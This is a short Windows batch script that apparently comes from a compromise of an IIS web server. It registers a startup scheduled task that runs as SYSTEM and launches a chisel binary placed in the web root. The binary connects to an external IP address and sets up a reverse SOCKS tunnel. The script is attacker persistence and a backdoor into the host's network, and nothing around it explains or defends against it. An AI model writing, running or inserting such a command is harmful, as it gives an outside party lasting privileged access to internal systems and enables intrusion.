@echo off
schtasks /create /tn X9137Chisel /tr "C:\inetpub\wwwroot\chisel.exe client --keepalive 25s 38.60.157.51:8904 R:11080:socks" /sc onstart /ru SYSTEM /rl HIGHEST /f
